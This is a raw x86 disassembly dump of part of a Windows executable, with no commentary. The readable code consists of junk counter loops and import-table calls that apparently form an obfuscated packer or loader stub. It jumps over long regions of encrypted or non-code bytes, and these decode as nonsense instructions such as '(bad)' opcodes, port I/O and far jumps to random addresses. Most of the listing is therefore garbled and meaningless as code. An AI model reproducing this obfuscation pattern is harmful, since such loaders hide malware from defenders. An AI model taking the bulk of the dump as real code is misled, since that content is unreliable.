  40a0c1:	jmp    0x40a0d1
  40a0c6:	mov    eax,ds:0x42aad1
  40a0cb:	inc    eax
  40a0cc:	mov    ds:0x42aad1,eax
  40a0d1:	cmp    DWORD PTR ds:0x42aad1,0x11
  40a0d8:	jae    0x40a110
  40a0de:	cmp    DWORD PTR ds:0x42aad1,0x1e
  40a0e5:	jne    0x40a0fb
  40a0eb:	push   0x89ca
  40a0f0:	push   0x6edd
  40a0f5:	call   DWORD PTR ds:0x41d244
  40a0fb:	jmp    0x40a0c6
  40a100:	mov    ecx,DWORD PTR ds:0x42a9ed
  40a106:	mov    eax,ds:0x42aac9
  40a10b:	sub    eax,ecx
  40a10d:	xor    ecx,DWORD PTR [ecx+eax*1]
  40a110:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  40a117:	mov    ecx,DWORD PTR ds:0x42aab5
  40a11d:	xor    eax,eax
  40a11f:	or     eax,DWORD PTR ds:0x42aaf1
  40a125:	sub    ecx,eax
  40a127:	imul   ecx,DWORD PTR [ecx+eax*1]
  40a12b:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40a132:	and    DWORD PTR ds:0x42a9c1,0x0
  40a13c:	jmp    0x40a14e
  40a141:	mov    ecx,DWORD PTR ds:0x42a9c1
  40a147:	inc    ecx
  40a148:	mov    DWORD PTR ds:0x42a9c1,ecx
  40a14e:	cmp    DWORD PTR ds:0x42a9c1,0x1d
  40a155:	jae    0x40a192
  40a15b:	cmp    DWORD PTR ds:0x42a9c1,0xb
  40a162:	jne    0x40a173
  40a168:	push   0x3d1a
  40a16d:	call   DWORD PTR ds:0x41d19c
  40a173:	cmp    DWORD PTR ds:0x42a9c1,0xa
  40a17a:	jne    0x40a18d
  40a180:	mov    ecx,DWORD PTR ds:0x42a9c1
  40a186:	inc    ecx
  40a187:	mov    DWORD PTR ds:0x42a9c1,ecx
  40a18d:	jmp    0x40a141
  40a192:	mov    eax,0x9567
  40a197:	mov    WORD PTR [ebp-0x4],ax
  40a19b:	add    DWORD PTR ds:0x42aa1d,ecx
  40a1a1:	jmp    0x40a4ba
  40a1a6:	cmp    al,0xc8
  40a1a8:	ret    0xd2d2
  40a1ab:	ror    ah,cl
  40a1ad:	into   
  40a1ae:	jge    0x40a22b
  40a1b0:	enter  0xe360,0x93
  40a1b4:	or     eax,0x78f9e246
  40a1b9:	js     0x40a22f
  40a1bb:	jle    0x40a235
  40a1bd:	js     0x40a1c9
  40a1bf:	pop    esi
  40a1c0:	(bad)  
  40a1c1:	xchg   edx,eax
  40a1c2:	xchg   esi,eax
  40a1c3:	mov    esi,0xcd8da1ac
  40a1c8:	mov    cs,WORD PTR [edi-0x1def1386]
  40a1ce:	scas   al,BYTE PTR es:[edi]
  40a1cf:	jne    0x40a18e
  40a1d1:	add    ebx,DWORD PTR [ebx-0x2c6cdde1]
  40a1d7:	clc    
  40a1d8:	pop    edi
  40a1d9:	sti    
  40a1da:	push   esp
  40a1db:	inc    edx
  40a1dc:	std    
  40a1dd:	xchg   ecx,eax
  40a1de:	loopne 0x40a168
  40a1e0:	inc    esi
  40a1e1:	ds (bad) 
  40a1e3:	mov    eax,0x481943f0
  40a1e8:	adc    DWORD PTR [ebp-0x1e008a05],ebp
  40a1ee:	xor    eax,DWORD PTR [eax]
  40a1f0:	jg     0x40a1e7
  40a1f2:	push   ds
  40a1f3:	cmc    
  40a1f4:	push   edi
  40a1f5:	push   edi
  40a1f6:	push   eax
  40a1f7:	xlat   BYTE PTR ds:[ebx]
  40a1f8:	mov    bl,BYTE PTR [di]
  40a1fb:	jmp    0x5a3c0493
  40a200:	fnsave [edx]
  40a202:	aaa    
  40a203:	sbb    dl,cl
  40a205:	dec    eax
  40a206:	jb     0x40a224
  40a208:	push   0xffffffaa
  40a20a:	cmc    
  40a20b:	push   esi
  40a20c:	ret    
  40a20d:	leave  
  40a20e:	mov    WORD PTR [esi+0x26665ba3],es
  40a214:	xchg   esi,eax
  40a215:	daa    
  40a216:	and    edi,0x91f235d8
  40a21c:	push   esi
  40a21d:	or     ch,BYTE PTR [ecx]
  40a21f:	sbb    DWORD PTR [ebx],eax
  40a221:	sub    DWORD PTR [edi+eiz*2-0x19a185a6],esp
  40a228:	(bad)  
  40a22a:	push   esi
  40a22b:	mov    al,0x1
  40a22d:	icebp  
  40a22e:	inc    edi
  40a22f:	mov    dh,BYTE PTR [eax-0x61]
  40a232:	push   ecx
  40a233:	retf   
  40a234:	fsqrt  
  40a236:	lds    ecx,FWORD PTR [esi-0x6b]
  40a239:	mov    cl,0x49
  40a23b:	sbb    eax,0xe7e2d664
  40a240:	jle    0x40a2b0
  40a242:	dec    ebp
  40a243:	(bad)  
  40a245:	ins    BYTE PTR es:[edi],dx
  40a246:	jge    0x40a2ad
  40a248:	mov    esp,0x14404466
  40a24d:	add    ebp,ecx
  40a24f:	cmp    DWORD PTR [eax+0x2f],edi
  40a252:	test   al,0x11
  40a254:	test   bl,ch
  40a256:	in     eax,0x58
  40a258:	shl    eax,cl
  40a25a:	stos   BYTE PTR es:[edi],al
  40a25b:	inc    edx
  40a25c:	sub    DWORD PTR [ecx],0x85e103b6
  40a262:	or     eax,DWORD PTR [edi]
  40a264:	test   al,dl
  40a266:	jmp    0x969d:0x92a1200b
  40a26d:	jmp    0xee7:0x904fb003
  40a274:	jns    0x40a233
  40a276:	pop    ss
  40a277:	dec    edi
  40a278:	neg    DWORD PTR [ecx-0x6dc0993d]
  40a27e:	push   ds
  40a27f:	ret    0x49bd
  40a282:	daa    
  40a283:	inc    esp
  40a284:	sub    eax,0xf664be7e
  40a289:	sub    al,0x89
  40a28b:	dec    esi
  40a28c:	xchg   ebp,eax
  40a28d:	cmp    ah,BYTE PTR [ebp-0x45c3ce3f]
  40a293:	cwde   
  40a294:	fbld   TBYTE PTR [eax]
  40a296:	dec    esi
  40a297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a298:	mov    WORD PTR [edx-0x12],ss
  40a29b:	mov    al,ds:0xb62f8bb5
  40a2a0:	add    al,BYTE PTR [ebp-0x64db7cf1]
  40a2a6:	or     al,0x80
  40a2a8:	xchg   ebp,eax
  40a2a9:	mov    es,WORD PTR [eax-0x49]
  40a2ac:	mov    esi,0x3d3b4eb5
  40a2b1:	xchg   esp,eax
  40a2b2:	xchg   edi,eax
  40a2b3:	push   edx
  40a2b4:	cmp    eax,0x730279a0
  40a2b9:	xchg   edi,eax
  40a2ba:	mov    eax,fs
  40a2bc:	outs   dx,DWORD PTR ds:[esi]
  40a2bd:	sbb    eax,0xa7a5727c
  40a2c2:	add    ah,ah
  40a2c4:	rol    DWORD PTR [ebx+0x69a4dac4],0x82
  40a2cb:	call   0xc9ce:0x2662b11d
  40a2d2:	sub    BYTE PTR [edx+0x7743231f],ch
  40a2d8:	add    al,BYTE PTR [ebx-0x67]
  40a2db:	adc    esi,DWORD PTR [eax]
  40a2dd:	and    BYTE PTR [ebx],cl
  40a2df:	inc    ebx
  40a2e0:	outs   dx,DWORD PTR ds:[esi]
  40a2e1:	lods   al,BYTE PTR ds:[esi]
  40a2e2:	adc    BYTE PTR [esi-0x25],cl
  40a2e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2e6:	rcl    DWORD PTR ds:0x69fa4019,0xaf
  40a2ed:	push   edx
  40a2ee:	call   0xbcdeda58
  40a2f3:	push   edx
  40a2f4:	(bad)  
  40a2f5:	pop    edx
  40a2f6:	pop    ebp
  40a2f7:	in     al,0xe7
  40a2f9:	pop    ebx
  40a2fa:	adc    DWORD PTR [ecx],edx
  40a2fc:	sub    esi,DWORD PTR [edi+ebx*4]
  40a2ff:	scas   al,BYTE PTR es:[edi]
  40a300:	test   BYTE PTR [esi-0x1e],0xb6
  40a304:	into   
  40a305:	aam    0xdc
  40a307:	je     0x40a334
  40a309:	jae    0x40a326
  40a30b:	arpl   WORD PTR [ecx+0x7],cx
  40a30e:	cmp    BYTE PTR [ebx*8+0x5497e46b],0x7d
  40a316:	cwde   
  40a317:	sbb    al,0xdc
  40a319:	inc    eax
  40a31a:	ret    
  40a31b:	call   0xabc83147
  40a320:	ret    
  40a321:	nop
  40a322:	call   0x651b:0x84a6edb2
  40a329:	pop    ecx
  40a32a:	div    BYTE PTR [ebx+0x2c725c51]
  40a330:	loopne 0x40a31b
  40a332:	inc    ecx
  40a333:	idiv   BYTE PTR [eax]
  40a335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a336:	test   BYTE PTR [eax-0x4],ah
  40a339:	mov    ds:0x4eed8abb,eax
  40a33e:	lods   eax,DWORD PTR ds:[esi]
  40a33f:	loop   0x40a33a
  40a341:	jno    0x40a3ad
  40a343:	xor    al,0x63
  40a345:	sub    DWORD PTR [esi-0x50],esi
  40a348:	(bad)  
  40a349:	and    DWORD PTR [ebx+0x70c4fe11],ecx
  40a34f:	fs sub al,0xf1
  40a352:	pop    ebp
  40a353:	leave  
  40a354:	out    dx,eax
  40a355:	xchg   esi,eax
  40a356:	das    
  40a357:	cmp    edx,DWORD PTR ds:0xfb8aa1c1
  40a35d:	mov    dh,0xd3
  40a35f:	into   
  40a360:	dec    eax
  40a361:	pop    esp
  40a362:	cmc    
  40a363:	(bad)  
  40a364:	push   ebx
  40a365:	sahf   
  40a366:	outs   dx,BYTE PTR ds:[esi]
  40a367:	dec    ebp
  40a368:	sub    ebp,DWORD PTR [ebx+0x6e927b33]
  40a36e:	ins    BYTE PTR es:[edi],dx
  40a36f:	and    DWORD PTR [ebx+edx*4-0x65],ecx
  40a373:	pop    edi
  40a374:	fnstcw WORD PTR [ebp+0x679b846e]
  40a37a:	and    al,0x14
  40a37c:	dec    eax
  40a37d:	scas   al,BYTE PTR es:[edi]
  40a37e:	call   DWORD PTR [ecx]
  40a380:	jl     0x40a38f
  40a382:	leave  
  40a383:	pop    ds
  40a384:	addr16 inc esi
  40a386:	lock sub ah,dh
  40a389:	test   al,0xc3
  40a38b:	dec    esp
  40a38c:	aad    0x2
  40a38e:	sub    BYTE PTR [ebx-0x73089dd1],0xe1
  40a395:	xchg   edi,eax
  40a396:	or     ah,BYTE PTR [eax+0x42888951]
  40a39c:	imul   esi,DWORD PTR [esi-0x34951869],0xffffffd2
  40a3a3:	stc    
  40a3a4:	stc    
  40a3a5:	cli    
  40a3a6:	cmp    DWORD PTR [ecx-0x30],0x46
  40a3aa:	sbb    esp,ebp
  40a3ac:	pop    ds
  40a3ad:	fdiv   DWORD PTR [ebx]
  40a3af:	sub    DWORD PTR [esi+0x52cc72eb],eax
  40a3b5:	in     al,dx
  40a3b6:	push   esi
  40a3b7:	outs   dx,BYTE PTR ds:[esi]
  40a3b8:	inc    esp
  40a3b9:	sbb    dl,BYTE PTR [ebx-0x2a]
  40a3bc:	int3   
  40a3bd:	pop    ebp
  40a3be:	mov    ds:0xe4b1f9ec,eax
  40a3c3:	fs jb  0x40a378
  40a3c6:	mov    dl,0x17
  40a3c8:	and    al,0x7f
  40a3ca:	cmc    
  40a3cb:	jge    0x40a39a
  40a3cd:	sub    ch,BYTE PTR [ebx-0x127c4b01]
  40a3d3:	iret   
  40a3d4:	aam    0xe4
  40a3d6:	fdivr  DWORD PTR [edi]
  40a3d8:	fcmove st,st(5)
  40a3da:	push   edx
  40a3db:	out    0xea,eax
  40a3dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3de:	loope  0x40a3f6
  40a3e0:	hlt    
  40a3e1:	pop    esi
  40a3e2:	pop    es
  40a3e3:	ja     0x40a456
  40a3e5:	adc    ah,0x3e
  40a3e8:	cmp    eax,0x8cceef12
  40a3ed:	outs   dx,DWORD PTR ds:[esi]
  40a3ee:	add    eax,0xb9be5bfc
  40a3f3:	and    esp,DWORD PTR [esi]
  40a3f5:	out    0x87,al
  40a3f7:	sub    ebp,eax
  40a3f9:	jecxz  0x40a46f
  40a3fb:	imul   esi,DWORD PTR [esp+ebp*8-0x71dfe565],0x65
  40a403:	pusha  
  40a404:	sahf   
  40a405:	adc    eax,0xa9f9eeb4
  40a40a:	pop    eax
  40a40b:	xchg   ecx,eax
  40a40c:	out    0x47,eax
  40a40e:	retf   0x92dc
  40a411:	pop    esp
  40a412:	inc    esp
  40a413:	shl    dl,cl
  40a415:	(bad)  
  40a416:	push   ecx
  40a417:	mov    eax,0x77c1bcf3
  40a41c:	xchg   ebp,eax
  40a41d:	nop
  40a41e:	pop    esi
  40a41f:	ret    
  40a420:	leave  
  40a421:	ror    esi,1
  40a423:	push   cs
  40a424:	dec    esi
  40a425:	add    eax,0x6d86d540
  40a42a:	xchg   ebx,eax
  40a42b:	ficomp DWORD PTR [edi]
  40a42d:	dec    edi
  40a42e:	jge    0x40a401
  40a430:	aas    
  40a431:	cmc    
  40a432:	adc    al,0x4d
  40a434:	and    eax,0x58bf8da5
  40a439:	out    dx,al
  40a43a:	test   BYTE PTR [ecx+0x7e258337],bh
  40a440:	ins    DWORD PTR es:[edi],dx
  40a441:	fldenv [eax+edi*1+0x5e686902]
  40a448:	jmp    0xc9bdfc29
  40a44d:	mov    ds:0xf49d075e,eax
  40a452:	fistp  DWORD PTR [esp+ebp*1+0x41bee538]
  40a459:	fistp  QWORD PTR [edi-0x62a91756]
  40a460:	push   es
  40a461:	sbb    BYTE PTR [esi-0x3e],bl
  40a464:	sbb    eax,0x5d824128
  40a469:	les    edx,FWORD PTR [esi]
  40a46b:	pop    ebx
  40a46c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a46d:	pop    ecx
  40a46e:	xchg   edi,eax
  40a46f:	int    0x86
  40a471:	ror    DWORD PTR [eax-0x6c47441d],0x60
  40a478:	imul   esp,ebp,0xffffffb2
  40a47b:	int3   
  40a47c:	stc    
  40a47d:	cmp    esp,DWORD PTR [ebx]
  40a47f:	rcl    DWORD PTR [edx-0x2e],1
  40a482:	push   eax
  40a483:	or     al,ch
  40a485:	(bad)  
  40a486:	icebp  
  40a487:	cs jg  0x40a419
  40a48a:	push   0x13
  40a48c:	outs   dx,BYTE PTR ds:[esi]
  40a48d:	stc    
  40a48e:	mov    ds:0xca6cca2a,eax
  40a493:	cmp    eax,0x11abe398
  40a498:	mov    dl,0xaf
  40a49a:	fistp  DWORD PTR [eax]
  40a49c:	leave  
  40a49d:	cmp    al,0xdb
  40a49f:	jg     0x40a42a
  40a4a1:	cli    
  40a4a2:	xchg   ecx,eax
  40a4a3:	test   eax,0xce85ea91
  40a4a8:	clc    
  40a4a9:	add    edx,DWORD PTR [ecx+0x9]
  40a4ac:	cwde   
  40a4ad:	mov    ss,WORD PTR ds:[eax-0x27]
  40a4b1:	and    eax,0xcb92201
  40a4b6:	in     al,dx
  40a4b7:	inc    esi
  40a4b8:	dec    eax
  40a4b9:	push   0x81dc458d
  40a4be:	and    eax,0x42aa2d
  40a4c3:	push   ebp
  40a4c4:	stos   BYTE PTR es:[edi],al
  40a4c5:	inc    edx
  40a4c6:	add    BYTE PTR [ecx+0x2d81d845],cl
  40a4cc:	jmp    0xd040e77b
  40a4d1:	xor    BYTE PTR [eax],al
  40a4d3:	add    BYTE PTR [ebx-0x367ef7bb],cl
  40a4d9:	mov    al,ds:0x8900003b
  40a4de:	inc    ebp
  40a4df:	loopne 0x40a462
  40a4e1:	and    eax,0x42a9d1
  40a4e6:	add    BYTE PTR [eax],al
  40a4e8:	add    BYTE PTR [eax],al
  40a4ea:	mov    ecx,DWORD PTR ds:0x42a9d1
  40a4f0:	inc    ecx
  40a4f1:	mov    DWORD PTR ds:0x42a9d1,ecx
  40a4f7:	cmp    DWORD PTR ds:0x42a9d1,0xc
  40a4fe:	jne    0x40a50d
  40a504:	push   DWORD PTR [ebp-0x24]
  40a507:	call   DWORD PTR ds:0x41d1a0
  40a50d:	cmp    DWORD PTR ds:0x42a9d1,0xb
  40a514:	jne    0x40a527
  40a51a:	mov    ecx,DWORD PTR ds:0x42a9d1
  40a520:	inc    ecx
  40a521:	mov    DWORD PTR ds:0x42a9d1,ecx
  40a527:	cmp    DWORD PTR ds:0x42a9d1,0x15
  40a52e:	jb     0x40a4ea
  40a534:	push   ebx
  40a535:	lea    eax,[ebp-0x18]
  40a538:	mov    ebx,DWORD PTR ds:0x42a9fd
  40a53e:	mov    ecx,DWORD PTR ds:0x42aab1
  40a544:	sub    ecx,ebx
  40a546:	and    ebx,DWORD PTR [ebx+ecx*1]
  40a549:	mov    DWORD PTR [ebp-0x1c],eax
  40a54c:	mov    eax,DWORD PTR [ebp-0x1c]
  40a54f:	and    DWORD PTR ds:0x42aae1,0x0
  40a559:	jmp    0x40a56d
  40a55e:	xor    ebx,ebx
  40a560:	add    ebx,DWORD PTR ds:0x42aae1
  40a566:	inc    ebx
  40a567:	mov    DWORD PTR ds:0x42aae1,ebx
  40a56d:	cmp    DWORD PTR ds:0x42aae1,0x15
  40a574:	jae    0x40a597
  40a57a:	cmp    DWORD PTR ds:0x42aae1,0x25
  40a581:	jne    0x40a592
  40a587:	push   0x6372
  40a58c:	call   DWORD PTR ds:0x41d0cc
  40a592:	jmp    0x40a55e
  40a597:	push   esi
  40a598:	and    DWORD PTR ds:0x42aaa9,0x0
  40a5a2:	mov    ebx,DWORD PTR ds:0x42aaa9
  40a5a8:	inc    ebx
  40a5a9:	mov    DWORD PTR ds:0x42aaa9,ebx
  40a5af:	cmp    DWORD PTR ds:0x42aaa9,0x7
  40a5b6:	jne    0x40a5dc
  40a5bc:	push   DWORD PTR [ebp-0x14]
  40a5bf:	push   0x2cb6
  40a5c4:	push   DWORD PTR [ebp-0x1c]
  40a5c7:	push   0x8d7c
  40a5cc:	push   0x42acc2
  40a5d1:	push   0x400000
  40a5d6:	call   DWORD PTR ds:0x41d248
  40a5dc:	cmp    DWORD PTR ds:0x42aaa9,0x6
  40a5e3:	jne    0x40a5f6
  40a5e9:	mov    ebx,DWORD PTR ds:0x42aaa9
  40a5ef:	inc    ebx
  40a5f0:	mov    DWORD PTR ds:0x42aaa9,ebx
  40a5f6:	cmp    DWORD PTR ds:0x42aaa9,0x1b
  40a5fd:	jb     0x40a5a2
  40a603:	push   edi
  40a604:	mov    edi,0xf89f2e50
  40a609:	jmp    0x40a922
  40a60e:	(bad)  
  40a60f:	ror    bh,0xca
  40a612:	int    0xd9
  40a614:	(bad)  
  40a616:	dec    eax
  40a617:	xor    BYTE PTR [edi+edi*2+0x10],dh
  40a61b:	mov    bl,0x1b
  40a61d:	pop    ecx
  40a61e:	fdivp  st(6),st
  40a620:	js     0x40a69a
  40a622:	je     0x40a6a2
  40a624:	js     0x40a69e
  40a626:	pop    esp
  40a627:	xor    DWORD PTR [esp+ecx*8],edi
  40a62a:	punpckhdq mm6,QWORD PTR [edi]
  40a62d:	or     eax,0xff1658a6
  40a632:	loop   0x40a5ca
  40a634:	push   esp
  40a635:	cmp    esi,DWORD PTR [ebx+0x61e3285]
  40a63b:	mov    ebx,0xb9efdfcb
  40a640:	in     al,dx
  40a641:	aaa    
  40a642:	dec    edi
  40a643:	cmp    eax,esp
  40a645:	mov    al,ds:0x643276d9
  40a64a:	lods   eax,DWORD PTR ds:[esi]
  40a64b:	outs   dx,BYTE PTR ds:[esi]
  40a64c:	add    DWORD PTR [edi],edi
  40a64e:	dec    edi
  40a64f:	arpl   WORD PTR [edx+0x4e28bc1f],ax
  40a655:	mov    ah,dh
  40a657:	je     0x40a62b
  40a659:	and    DWORD PTR [ebp-0x1],ecx
  40a65c:	xchg   esp,eax
  40a65d:	imul   edx,DWORD PTR [ebp+0x33],0x4fdede8
  40a664:	sbb    al,0x94
  40a666:	(bad)  
  40a667:	sbb    esi,DWORD PTR [eax]
  40a669:	pop    ebp
  40a66a:	dec    ebp
  40a66b:	pop    esi
  40a66c:	jg     0x40a648
  40a66e:	(bad)  
  40a66f:	push   eax
  40a670:	das    
  40a671:	dec    edx
  40a672:	push   0xfbb1d225
  40a677:	int    0xd6
  40a679:	xchg   BYTE PTR [ecx+esi*2-0x6e],dl
  40a67d:	xchg   edx,eax
  40a67e:	mov    dh,0xb2
  40a680:	xchg   esp,eax
  40a681:	push   0x3cd6616a
  40a686:	pop    ebx
  40a687:	adc    ebx,DWORD PTR fs:[ebp+0x23]
  40a68b:	test   eax,0xe7eac21
  40a690:	clc    
  40a691:	cdq    
  40a692:	adc    ebp,esi
  40a694:	call   FWORD PTR [ecx+0x12]
  40a697:	or     ebp,DWORD PTR [esi]
  40a699:	aas    
  40a69a:	leave  
  40a69b:	push   edx
  40a69c:	jbe    0x40a654
  40a69e:	pop    ss
  40a69f:	mov    edx,0x5761c255
  40a6a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6a5:	repnz sub al,0x69
  40a6a8:	cdq    
  40a6a9:	sbb    BYTE PTR [ebx+edx*1+0x30],dh
  40a6ad:	lahf   
  40a6ae:	imul   ebp,DWORD PTR [esi-0x7106823f],0x59
  40a6b5:	in     al,dx
  40a6b6:	dec    eax
  40a6b7:	inc    ecx
  40a6b8:	and    DWORD PTR [ebx],edi
  40a6ba:	mov    dh,dh
  40a6bc:	fucomi st,st(5)
  40a6be:	in     eax,0x52
  40a6c0:	adc    DWORD PTR [ecx+edx*1+0x34],0x2e
  40a6c5:	sub    eax,0xf50dbc76
  40a6ca:	jle    0x40a716
  40a6cc:	ffree  st(4)
  40a6ce:	push   0xfffffff2
  40a6d0:	sbb    esp,DWORD PTR [ebp-0x1f]
  40a6d3:	xchg   esp,eax
  40a6d4:	xlat   BYTE PTR ds:[ebx]
  40a6d5:	mov    bl,BYTE PTR [edx+eiz*8]
  40a6d8:	sub    BYTE PTR [ebx],ah
  40a6da:	enter  0xa4d9,0x5
  40a6de:	aad    0xa5
  40a6e0:	fs dec edi
  40a6e2:	test   DWORD PTR [ecx-0x6a5a9fdc],0x4d92a7b9
  40a6ec:	(bad)  
  40a6ed:	js     0x40a716
  40a6ef:	adc    ebx,edx
  40a6f1:	dec    edx
  40a6f2:	mov    WORD PTR [ebx+0x40d8d219],ss
  40a6f8:	stos   DWORD PTR es:[edi],eax
  40a6f9:	push   esi
  40a6fa:	or     dh,ch
  40a6fc:	popf   
  40a6fd:	jo     0x40a72b
  40a6ff:	mov    al,0xbb
  40a701:	or     edi,DWORD PTR [esi]
  40a703:	lahf   
  40a704:	(bad)  
  40a705:	outs   dx,BYTE PTR ds:[esi]
  40a706:	fcom   QWORD PTR [ecx-0x46]
  40a709:	sub    eax,eax
  40a70b:	or     bl,BYTE PTR [esi]
  40a70d:	stc    
  40a70e:	sti    
  40a70f:	loop   0x40a72f
  40a711:	fmul   DWORD PTR [edx+0x3edb5063]
  40a717:	scas   al,BYTE PTR es:[edi]
  40a718:	shr    BYTE PTR [eax-0x568100b2],0x6b
  40a71f:	mov    dl,0xfe
  40a721:	fs retf 0x3743
  40a725:	inc    eax
  40a726:	mov    ?,WORD PTR [edx+0x2e]
  40a729:	cwde   
  40a72a:	shr    BYTE PTR [eax-0x5cda856],0x49
  40a731:	test   ax,0x868f
  40a735:	aad    0xeb
  40a737:	push   eax
  40a738:	test   eax,0xa6b04262
  40a73d:	pop    eax
  40a73e:	push   esi
  40a73f:	sbb    dl,BYTE PTR [ebx+edx*2-0x37fafbe8]
  40a746:	gs inc ebx
  40a748:	pop    ebx
  40a749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a74a:	(bad)  
  40a74b:	or     dh,BYTE PTR [eax+0x3c]
  40a74e:	xor    al,BYTE PTR [edx+0x77825594]
  40a754:	jmp    0x40a74f
  40a756:	loope  0x40a752
  40a758:	jns    0x40a6db
  40a75a:	addr16 dec esi
  40a75c:	hlt    
  40a75d:	push   ebp
  40a75e:	push   esi
  40a75f:	add    eax,0x421b1a88
  40a764:	fwait
  40a765:	mov    ah,0x1d
  40a767:	mov    ecx,0xa79b3699
  40a76c:	push   esp
  40a76d:	pop    esp
  40a76e:	repnz xlat BYTE PTR ds:[ebx]
  40a770:	pusha  
  40a771:	xor    eax,0xbb7ffd25
  40a776:	(bad)  
  40a777:	pop    esp
  40a778:	mov    al,ds:0xef3683b3
  40a77d:	adc    ecx,DWORD PTR [eax+ecx*8+0x3d56c206]
  40a784:	fcomp  DWORD PTR [eax+ecx*4]
  40a787:	iret   
  40a788:	push   ss
  40a789:	sub    eax,0x41acb70c
  40a78e:	xor    esi,ebp
  40a790:	cmc    
  40a791:	sub    BYTE PTR [ebx-0x32],dl
  40a794:	retf   
  40a795:	mov    eax,ecx
  40a797:	xchg   esp,eax
  40a798:	loope  0x40a741
  40a79a:	in     al,dx
  40a79b:	js     0x40a7a5
  40a79d:	pushf  
  40a79e:	jnp    0x40a796
  40a7a0:	push   ds
  40a7a1:	iret   
  40a7a2:	stc    
  40a7a3:	lds    edi,FWORD PTR ds:0x68cbdd17
  40a7a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7aa:	test   eax,0x2faf102c
  40a7af:	(bad)  
  40a7b0:	ret    0x996b
  40a7b3:	retf   0xfa0c
  40a7b6:	je     0x40a757
  40a7b8:	mov    edx,0xed55a63b
  40a7bd:	ret    
  40a7be:	ret    
  40a7bf:	inc    eax
  40a7c0:	xchg   edi,eax
  40a7c1:	push   ebx
  40a7c2:	push   edx
  40a7c3:	cmc    
  40a7c4:	lods   al,BYTE PTR ds:[esi]
  40a7c5:	sbb    bl,bl
  40a7c7:	fld    DWORD PTR [esi-0x124b2d2b]
  40a7cd:	and    al,0x2d
  40a7cf:	xchg   ebx,eax
  40a7d0:	sbb    al,0xc0
  40a7d2:	jp     0x40a813
  40a7d4:	mov    ebx,0x20f59702
  40a7d9:	or     BYTE PTR [ebp+0x7f],cl
  40a7dc:	fiadd  DWORD PTR [edi+0x151d5291]
  40a7e2:	shr    DWORD PTR [ecx+0x6],0xfd
  40a7e6:	repnz push cs
  40a7e8:	and    ecx,eax
  40a7ea:	jge    0x40a831
  40a7ec:	add    eax,0x152eb5ef
  40a7f1:	mov    dh,0xb5
  40a7f3:	vsqrtsd xmm4,xmm3,QWORD PTR [eax-0x40]
  40a7f8:	xor    al,0x5e
  40a7fa:	ret    0x5231
  40a7fd:	cmp    al,0x5f
  40a7ff:	or     al,0x69
  40a801:	aaa    
  40a802:	xchg   edx,eax
  40a803:	rcl    BYTE PTR [edi+0x56],0x27
  40a807:	xchg   edx,eax
  40a808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a809:	sub    esp,0xfffffffc
  40a80c:	(bad)  
  40a80d:	pop    edx
  40a80e:	hlt    
  40a80f:	push   ds
  40a810:	sub    esi,edx
  40a812:	cmp    ah,cl
  40a814:	add    al,BYTE PTR [edx-0x37]
  40a817:	sub    edi,ebx
  40a819:	iret   
  40a81a:	test   BYTE PTR [ebp-0x63],bh
  40a81d:	test   DWORD PTR [edx+0x30],edx
  40a820:	mov    edi,0x571dd577
  40a825:	mov    dh,0x70
  40a827:	xlat   BYTE PTR ds:[ebx]
  40a828:	push   edx
  40a829:	aaa    
  40a82a:	jmp    0x91d3:0x17512cdd
  40a831:	xchg   ecx,eax
  40a832:	mov    ebp,0x8cca3f2f
  40a837:	sti    
  40a838:	mov    ebx,DWORD PTR [esi]
  40a83a:	sbb    ebp,ebp
  40a83c:	fidivr WORD PTR [eax+0x5c]
  40a83f:	push   0x3f7fd3fe
  40a844:	mov    al,0x39
  40a846:	(bad)  
  40a847:	sti    
  40a848:	cmp    eax,DWORD PTR [ebx-0x71048d87]
  40a84e:	dec    ecx
  40a84f:	jne    0x40a854
  40a851:	xor    eax,0xb50d649a
  40a856:	data16 ja 0x40a82e
  40a859:	and    al,BYTE PTR [edi]
  40a85b:	ror    DWORD PTR [ebx],0x47
  40a85e:	and    DWORD PTR [ebx+0x23a95b56],edx
  40a864:	push   ds
  40a865:	pushf  
  40a866:	and    eax,ecx
  40a868:	sbb    edx,DWORD PTR [ebx]
  40a86a:	mov    bh,0x52
  40a86c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a86d:	shl    DWORD PTR [edi],0x6e
  40a870:	mov    esi,0x403da314
  40a875:	jae    0x40a89b
  40a877:	push   0x21
  40a879:	out    0xed,al
  40a87b:	rcr    DWORD PTR [ecx-0x43],cl
  40a87e:	lds    esi,FWORD PTR [ecx-0x13]
  40a881:	jbe    0x40a8b0
  40a883:	int3   
  40a884:	loop   0x40a8b4
  40a886:	ins    BYTE PTR es:[edi],dx
  40a887:	pop    edi
  40a888:	call   0xde54d735
  40a88d:	lds    ecx,FWORD PTR [ebp-0x24b1b6a6]
  40a893:	mov    dl,BYTE PTR [eax+0x7d0d61a8]
  40a899:	mov    ebp,0xea6f0d6d
  40a89e:	mov    bh,0x5c
  40a8a0:	or     ch,ch
  40a8a2:	xchg   ecx,eax
  40a8a3:	ss push ds
  40a8a5:	retf   0x4a6d
  40a8a8:	test   BYTE PTR [ebp+0x4c63137f],bh
  40a8ae:	or     DWORD PTR [ebx-0x6c],esi
  40a8b1:	pop    ds
  40a8b2:	cmp    eax,esp
  40a8b4:	adc    dh,ah
  40a8b6:	mov    DWORD PTR [edx+0x4d],ecx
  40a8b9:	adc    DWORD PTR [eax-0x5a6192ca],ebp
  40a8bf:	hlt    
  40a8c0:	rol    DWORD PTR [eax],cl
  40a8c2:	fcmovne st,st(5)
  40a8c4:	test   DWORD PTR [edx+edx*8],esp
  40a8c7:	hlt    
  40a8c8:	sti    
  40a8c9:	pop    ss
  40a8ca:	xchg   ecx,eax
  40a8cb:	xchg   esi,eax
  40a8cc:	or     al,0x35
  40a8ce:	ficom  DWORD PTR [edx]
  40a8d0:	dec    esp
  40a8d1:	out    dx,al
  40a8d2:	fiadd  DWORD PTR [edx+0xa98bb53]
  40a8d8:	cmp    ah,BYTE PTR [ebp+0x6e]
